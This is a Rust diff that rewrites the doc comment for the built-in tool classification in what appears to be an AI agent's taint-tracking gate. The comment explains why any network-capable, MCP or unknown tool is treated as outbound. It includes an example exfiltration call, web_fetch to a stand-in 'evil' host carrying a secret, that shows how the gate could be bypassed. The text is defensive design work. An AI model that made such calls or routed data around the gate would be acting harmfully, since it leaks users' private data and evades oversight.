@@ -427,16 +427,16 @@ pub enum GateDecisionSource {
 /// Built-in tool classification defaults.
 ///
 /// The taint gate only fires on tools classified [`ToolDirection::Outbound`], so
-/// this table decides what data-flow enforcement can see at all. It used to mark
-/// **only** `shell`/`bash` as outbound, which meant a Private-tainted context
-/// could be exfiltrated by `web_fetch("https://evil/?d=<secret>")` with taint
-/// tracking fully enabled - along with any MCP tool and any script tool, all of
-/// which fell through to the internal/internal default and were never gated.
+/// this table decides what data-flow enforcement can see at all. Anything that
+/// can carry bytes off the machine must be outbound: marking **only**
+/// `shell`/`bash` would let a Private-tainted context be exfiltrated by
+/// `web_fetch("https://evil/?d=<secret>")` with taint tracking fully enabled -
+/// along with any MCP tool and any script tool, which an internal/internal
+/// fallback would never gate.
 ///
-/// Anything that can carry bytes off the machine is outbound now, and the
-/// fallback for an *unknown* tool is outbound too. An unrecognized tool is
+/// The fallback for an *unknown* tool is outbound too. An unrecognized tool is
 /// usually an MCP or script tool - third-party code reaching a third-party
-/// service - so treating it as internal was assuming the safest case about the
+/// service - so an internal default would assume the safest case about the
 /// least-known code. Failing closed costs a prompt; failing open costs the data.
 pub fn builtin_tool_classification(tool_name: &str) -> ToolClassification {
     match tool_name {
